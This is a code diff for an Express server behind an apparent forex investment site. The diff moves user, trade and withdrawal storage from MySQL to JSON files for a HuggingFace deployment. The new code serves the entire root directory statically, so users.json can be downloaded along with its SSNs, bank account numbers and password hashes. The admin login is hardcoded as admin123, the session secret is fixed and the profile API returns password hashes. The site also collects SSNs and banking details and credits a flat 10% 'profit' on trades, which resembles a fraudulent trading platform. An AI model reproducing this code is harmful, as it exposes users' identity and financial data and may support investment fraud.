@@ -1,107 +1,192 @@
 const express = require('express');
 const session = require('express-session');
-const mysql = require('mysql2/promise');
 const bcrypt = require('bcryptjs');
 const path = require('path');
 const bodyParser = require('body-parser');
 const crypto = require('crypto');
+const fs = require('fs');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 7860;
 
-// Middleware
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public')));
+// Middleware (HuggingFace compatible)
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(".")); // Serve everything from root directory
+
+// Session middleware
 app.use(session({
-    secret: 'your-secret-key-change-in-production',
+    secret: process.env.SESSION_SECRET || 'huggingface-space-secret-key',
     resave: false,
     saveUninitialized: true,
     cookie: { secure: false }
 }));
 
-// Database configuration
-const dbConfig = {
-    host: process.env.DB_HOST || 'localhost',
-    user: process.env.DB_USER || 'root',
-    password: process.env.DB_PASS || '',
-    database: process.env.DB_NAME || 'iqoptions_forex'
-};
+// JSON file for persistent user storage (instead of MySQL)
+const usersFile = path.join(__dirname, 'users.json');
+const tradesFile = path.join(__dirname, 'trades.json');
+const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
+
+// Load data from JSON files
+function loadUsers() {
+    try {
+        if (fs.existsSync(usersFile)) {
+            const data = fs.readFileSync(usersFile, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        console.error('Error loading users:', error);
+    }
+    return [];
+}
+
+function loadTrades() {
+    try {
+        if (fs.existsSync(tradesFile)) {
+            const data = fs.readFileSync(tradesFile, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        console.error('Error loading trades:', error);
+    }
+    return [];
+}
+
+function loadWithdrawals() {
+    try {
+        if (fs.existsSync(withdrawalsFile)) {
+            const data = fs.readFileSync(withdrawalsFile, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        console.error('Error loading withdrawals:', error);
+    }
+    return [];
+}
+
+// Save data to JSON files
+function saveUsers() {
+    try {
+        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
+        console.log('💾 Users saved to file. Total users:', users.length);
+    } catch (error) {
+        console.error('Error saving users:', error);
+    }
+}
+
+function saveTrades() {
+    try {
+        fs.writeFileSync(tradesFile, JSON.stringify(trades, null, 2));
+        console.log('💾 Trades saved to file. Total trades:', trades.length);
+    } catch (error) {
+        console.error('Error saving trades:', error);
+    }
+}
+
+function saveWithdrawals() {
+    try {
+        fs.writeFileSync(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
+        console.log('💾 Withdrawals saved to file. Total withdrawals:', withdrawals.length);
+    } catch (error) {
+        console.error('Error saving withdrawals:', error);
+    }
+}
+
+// Initialize data from files
+let users = loadUsers();
+let trades = loadTrades();
+let withdrawals = loadWithdrawals();
 
 // Utility function to generate random IDs
 function generateId(length = 6) {
     return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length).toUpperCase();
 }
 
-// Database connection middleware
-app.use(async (req, res, next) => {
-    try {
-        req.db = await mysql.createConnection(dbConfig);
-        next();
-    } catch (error) {
-        console.error('Database connection error:', error);
-        res.status(500).send('Database connection error');
-    }
-});
-
-// Serve static files from various directories
-app.use('/css', express.static(path.join(__dirname, 'css')));
-app.use('/js', express.static(path.join(__dirname, 'js')));
-app.use('/img', express.static(path.join(__dirname, 'img')));
-app.use('/fonts', express.static(path.join(__dirname, 'fonts')));
-app.use('/access/css', express.static(path.join(__dirname, 'access/css')));
-app.use('/access/fonts', express.static(path.join(__dirname, 'access/fonts')));
-app.use('/access/js', express.static(path.join(__dirname, 'access/js')));
-app.use('/dashboard/plugins', express.static(path.join(__dirname, 'dashboard/plugins')));
-
-// Template engine setup for dynamic content
-app.engine('html', require('ejs').renderFile);
-app.set('view engine', 'html');
-app.set('views', path.join(__dirname));
+// Generate transaction ID
+function generateTransactionId() {
+    return 'TRX' + Date.now().toString().slice(-9) + Math.random().toString(36).substr(2, 3).toUpperCase();
+}
 
 // Routes
 
-// Home page
+// Serve main pages
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// About page
 app.get('/about.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'about.php'));
 });
 
-// Packages page
 app.get('/packages.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'packages.php'));
 });
 
-// Terms page
 app.get('/terms.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'terms.php'));
 });
 
-// Login page
+app.get('/successful_reg.php', (req, res) => {
+    res.sendFile(path.join(__dirname, 'successful_reg.php'));
+});
+
+app.get('/success_recovery.php', (req, res) => {
+    res.sendFile(path.join(__dirname, 'success_recovery.php'));
+});
+
+// Auth pages
 app.get('/access/login.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'access/login.html'));
 });
 
-// Register page
 app.get('/access/register.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'access/register.html'));
 });
 
-// Forgot password page
 app.get('/access/forget_password.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'access/forget_password.html'));
 });
 
-// Admin login page
 app.get('/access/adminlogin.php', (req, res) => {
     res.sendFile(path.join(__dirname, 'access/adminlogin.html'));
 });
 
-// Process registration
+// Dashboard pages
+app.get('/dashboard/home.php', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard/home.html'));
+});
+
+app.get('/dashboard/profile.php', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard/profile.html'));
+});
+
+app.get('/dashboard/wallet.php', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard/wallet.html'));
+});
+
+app.get('/dashboard/transactions.php', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard/transactions.html'));
+});
+
+app.get('/dashboard/admin_dashboard.php', requireAdminAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'dashboard/admin_dashboard.html'));
+});
+
+// API Routes
+
+// Health check endpoint (HuggingFace compatible)
+app.get("/api/health", (req, res) => {
+    res.json({ 
+        status: "OK", 
+        timestamp: new Date().toISOString(),
+        usersCount: users.length,
+        tradesCount: trades.length,
+        withdrawalsCount: withdrawals.length,
+        storage: "json-file"
+    });
+});
+
+// User registration
 app.post('/controller/registration.php', async (req, res) => {
     try {
         const { name, email, country, password, cpassword, terms } = req.body;
@@ -117,9 +202,8 @@ app.post('/controller/registration.php', async (req, res) => {
         }
         
         // Check if email already exists
-        const [existingUsers] = await req.db.execute('SELECT * FROM members WHERE email = ?', [email]);
-        
-        if (existingUsers.length > 0) {
+        const existingUser = users.find(user => user.email === email);
+        if (existingUser) {
             req.session.alertMsg = '<div class="alert alert-danger">Email already registered!</div>';
             return res.redirect('/access/register.php');
         }
@@ -129,17 +213,35 @@ app.post('/controller/registration.php', async (req, res) => {
         const accountId = generateId();
         const token = generateId(12);
         
-        // Insert new user
-        await req.db.execute(
-            'INSERT INTO members (account_id, name, email, country, password, token, status, date) VALUES (?, ?, ?, ?, ?, ?, 0, ?)',
-            [accountId, name, email, country, hashedPassword, token, new Date().toLocaleString()]
-        );
+        // Create new user
+        const newUser = {
+            id: users.length + 1,
+            account_id: accountId,
+            name: name,
+            email: email,
+            phone: '',
+            plan: '',
+            country: country,
+            bank: '',
+            account_name: '',
+            account_number: '',
+            ssn: '',
+            pobox: '',
+            token: token,
+            status: 1, // Auto-verify for demo
+            date: new Date().toLocaleString(),
+            password: hashedPassword,
+            balance: 0,
+            profit: 0
+        };
         
-        // Set session variables for email verification
+        users.push(newUser);
+        saveUsers();
+        
+        // Set session variables
         req.session.reg_name = name;
         req.session.reg_email = email;
         req.session.reg_client_id = accountId;
-        req.session.reg_token = `https://iqoptionsforex.com/controller/verification.php?token=${token}`;
         
         res.redirect('/successful_reg.php');
         
@@ -150,23 +252,15 @@ app.post('/controller/registration.php', async (req, res) => {
     }
 });
 
-// Process login
+// User login
 app.post('/controller/process_login.php', async (req, res) => {
     try {
         const { email, password } = req.body;
         
-        const [users] = await req.db.execute('SELECT * FROM members WHERE email = ?', [email]);
+        const user = users.find(u => u.email === email);
         
-        if (users.length === 0) {
+        if (!user) {
             req.session.alertMsg = '<div class="alert alert-danger">Invalid email or password!</div>';
-            return res.redirect('/access/login.php');
-        }
-        
-        const user = users[0];
-        
-        // Check if account is verified
-        if (user.status === 0) {
-            req.session.alertMsg = '<div class="alert alert-danger">Please verify your email address first!</div>';
             return res.redirect('/access/login.php');
         }
         
@@ -191,25 +285,24 @@ app.post('/controller/process_login.php', async (req, res) => {
     }
 });
 
-// Process admin login
+// Admin login
 app.post('/access/adminlogin.php', async (req, res) => {
     try {
         const { email, password } = req.body;
         
-        const [admins] = await req.db.execute('SELECT * FROM admin WHERE email = ? AND password = ?', [email, password]);
+        // Default admin credentials (change in production)
+        const adminEmail = 'admin@iqoptionsforex.com';
+        const adminPassword = 'admin123';
         
-        if (admins.length === 0) {
+        if (email === adminEmail && password === adminPassword) {
+            req.session.admin = adminEmail;
+            req.session.admin_id = 1;
+            req.session.admin_loggedin = true;
+            res.redirect('/dashboard/admin_dashboard.php');
+        } else {
             req.session.alertMsg = '<div class="alert alert-danger">Invalid admin credentials!</div>';
-            return res.redirect('/access/adminlogin.php');
+            res.redirect('/access/adminlogin.php');
         }
-        
-        const admin = admins[0];
-        
-        req.session.admin = admin.email;
-        req.session.admin_id = admin.id;
-        req.session.admin_loggedin = true;
-        
-        res.redirect('/dashboard/admin_dashboard.php');
         
     } catch (error) {
         console.error('Admin login error:', error);
@@ -218,23 +311,19 @@ app.post('/access/adminlogin.php', async (req, res) => {
     }
 });
 
-// Process forgot password
+// Forgot password
 app.post('/controller/process_forget_password.php', async (req, res) => {
     try {
         const { email } = req.body;
         
-        const [users] = await req.db.execute('SELECT * FROM members WHERE email = ?', [email]);
+        const user = users.find(u => u.email === email);
         
-        if (users.length === 0) {
+        if (!user) {
             req.session.alertMsg = '<div class="alert alert-danger">Email not found!</div>';
             return res.redirect('/access/forget_password.php');
         }
         
-        const user = users[0];
         const reference_number = generateId(8);
-        
-        // In a real application, you would send an email here
-        // For now, we'll just set session variables
         
         req.session.fullname = user.name;
         req.session.reference_number = reference_number;
@@ -248,13 +337,13 @@ app.post('/controller/process_forget_password.php', async (req, res) => {
     }
 });
 
-// Process contact form
+// Contact form
 app.post('/controller/process_contact.php', async (req, res) => {
     try {
         const { name, email, message } = req.body;
         
-        // Here you would typically save the contact form data to database
-        // and/or send an email notification
+        // In a real app, you'd save this to a database
+        console.log('Contact form submission:', { name, email, message });
         
         req.session.contactMsg = '<div class="alert alert-success">Thank you for your message! We will get back to you soon.</div>';
         res.redirect('/');
@@ -266,44 +355,115 @@ app.post('/controller/process_contact.php', async (req, res) => {
     }
 });
 
-// Dashboard routes (protected)
-app.get('/dashboard/home.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/home.html'));
-});
-
-app.get('/dashboard/profile.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/profile.html'));
-});
-
-app.get('/dashboard/wallet.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/wallet.html'));
-});
-
-app.get('/dashboard/transactions.php', requireAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/transactions.html'));
-});
-
-// Admin dashboard routes
-app.get('/dashboard/admin_dashboard.php', requireAdminAuth, (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard/admin_dashboard.html'));
-});
-
-// Success pages
-app.get('/successful_reg.php', (req, res) => {
-    if (!req.session.reg_name) {
-        return res.redirect('/access/register.php');
+// API endpoints for dashboard data
+app.get('/api/user/profile', requireAuth, async (req, res) => {
+    try {
+        const user = users.find(u => u.id === req.session.user.id);
+        res.json(user || {});
+    } catch (error) {
+        console.error('Profile API error:', error);
+        res.status(500).json({ error: 'Failed to fetch profile' });
     }
-    res.sendFile(path.join(__dirname, 'successful_reg.html'));
 });
 
-app.get('/success_recovery.php', (req, res) => {
-    if (!req.session.fullname) {
-        return res.redirect('/access/forget_password.php');
+app.get('/api/user/trades', requireAuth, async (req, res) => {
+    try {
+        const userTrades = trades.filter(trade => trade.client_id === req.session.user.account_id)
+                                .sort((a, b) => new Date(b.date) - new Date(a.date))
+                                .slice(0, 10);
+        res.json(userTrades);
+    } catch (error) {
+        console.error('Trades API error:', error);
+        res.status(500).json({ error: 'Failed to fetch trades' });
     }
-    res.sendFile(path.join(__dirname, 'success_recovery.html'));
 });
 
-// Logout routes
+app.get('/api/user/withdrawals', requireAuth, async (req, res) => {
+    try {
+        const userWithdrawals = withdrawals.filter(w => w.account_id === req.session.user.account_id)
+                                          .sort((a, b) => new Date(b.date) - new Date(a.date));
+        res.json(userWithdrawals);
+    } catch (error) {
+        console.error('Withdrawals API error:', error);
+        res.status(500).json({ error: 'Failed to fetch withdrawals' });
+    }
+});
+
+// Update user profile
+app.post('/api/user/update-profile', requireAuth, async (req, res) => {
+    try {
+        const { phone, bank, account_name, account_number, ssn, pobox } = req.body;
+        const userIndex = users.findIndex(u => u.id === req.session.user.id);
+        
+        if (userIndex !== -1) {
+            users[userIndex].phone = phone || '';
+            users[userIndex].bank = bank || '';
+            users[userIndex].account_name = account_name || '';
+            users[userIndex].account_number = account_number || '';
+            users[userIndex].ssn = ssn || '';
+            users[userIndex].pobox = pobox || '';
+            
+            saveUsers();
+            
+            // Update session
+            req.session.user = users[userIndex];
+            
+            res.json({ success: true, message: 'Profile updated successfully!' });
+        } else {
+            res.status(404).json({ success: false, message: 'User not found' });
+        }
+    } catch (error) {
+        console.error('Update profile error:', error);
+        res.status(500).json({ success: false, message: 'Failed to update profile' });
+    }
+});
+
+// Create demo trade (for testing)
+app.post('/api/demo/trade', requireAuth, async (req, res) => {
+    try {
+        const { amount, plan } = req.body;
+        const user = users.find(u => u.id === req.session.user.id);
+        
+        if (!user) {
+            return res.status(404).json({ success: false, message: 'User not found' });
+        }
+        
+        const profit = parseFloat(amount) * 0.1; // 10% profit for demo
+        const newTrade = {
+            id: trades.length + 1,
+            date: new Date().toLocaleString(),
+            transact_id: generateTransactionId(),
+            client_id: user.account_id,
+            status: 'Completed',
+            balance: (parseFloat(user.balance || 0) + parseFloat(amount) + profit).toFixed(2),
+            profit: profit.toFixed(2),
+            bonus: '0'
+        };
+        
+        trades.push(newTrade);
+        saveTrades();
+        
+        // Update user balance
+        const userIndex = users.findIndex(u => u.id === req.session.user.id);
+        users[userIndex].balance = newTrade.balance;
+        users[userIndex].profit = (parseFloat(user.profit || 0) + profit).toFixed(2);
+        saveUsers();
+        
+        req.session.user = users[userIndex];
+        
+        res.json({ 
+            success: true, 
+            trade: newTrade,
+            message: 'Trade completed successfully!' 
+        });
+        
+    } catch (error) {
+        console.error('Demo trade error:', error);
+        res.status(500).json({ success: false, message: 'Trade failed' });
+    }
+});
+
+// Logout
 app.get('/controller/logout.php', (req, res) => {
     req.session.destroy();
     res.redirect('/');
@@ -327,51 +487,26 @@ function requireAdminAuth(req, res, next) {
     }
 }
 
-// API endpoints for dashboard data
-app.get('/api/user/profile', requireAuth, async (req, res) => {
-    try {
-        const [users] = await req.db.execute('SELECT * FROM members WHERE id = ?', [req.session.user.id]);
-        res.json(users[0] || {});
-    } catch (error) {
-        console.error('Profile API error:', error);
-        res.status(500).json({ error: 'Failed to fetch profile' });
-    }
+// 404 handler for API routes
+app.use('/api/*', (req, res) => {
+    res.status(404).json({
+        success: false,
+        message: 'API endpoint not found'
+    });
 });
 
-app.get('/api/user/trades', requireAuth, async (req, res) => {
-    try {
-        const [trades] = await req.db.execute(
-            'SELECT * FROM trades WHERE client_id = ? ORDER BY date DESC LIMIT 10',
-            [req.session.user.account_id]
-        );
-        res.json(trades);
-    } catch (error) {
-        console.error('Trades API error:', error);
-        res.status(500).json({ error: 'Failed to fetch trades' });
-    }
+// Start server (HuggingFace compatible)
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 iqoptions forex Server running on port ${PORT}`);
+    console.log(`📊 Loaded ${users.length} users from storage`);
+    console.log(`📈 Loaded ${trades.length} trades from storage`);
+    console.log(`💰 Loaded ${withdrawals.length} withdrawals from storage`);
+    console.log(`🌐 Main Website: http://localhost:${PORT}`);
+    console.log(`🔐 Login: http://localhost:${PORT}/access/login.php`);
+    console.log(`📱 Register: http://localhost:${PORT}/access/register.php`);
+    console.log(`🔍 Health check: http://localhost:${PORT}/api/health`);
+    console.log('✅ Server is ready for HuggingFace Space!');
 });
 
-app.get('/api/user/withdrawals', requireAuth, async (req, res) => {
-    try {
-        const [withdrawals] = await req.db.execute(
-            'SELECT * FROM withrawals WHERE account_id = ? ORDER BY date DESC',
-            [req.session.user.account_id]
-        );
-        res.json(withdrawals);
-    } catch (error) {
-        console.error('Withdrawals API error:', error);
-        res.status(500).json({ error: 'Failed to fetch withdrawals' });
-    }
-});
-
-// Start server
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Visit: http://localhost:${PORT}`);
-});
-
-// Graceful shutdown
-process.on('SIGINT', async () => {
-    console.log('\nShutting down server...');
-    process.exit(0);
-});
+// Export for HuggingFace
+module.exports = app;
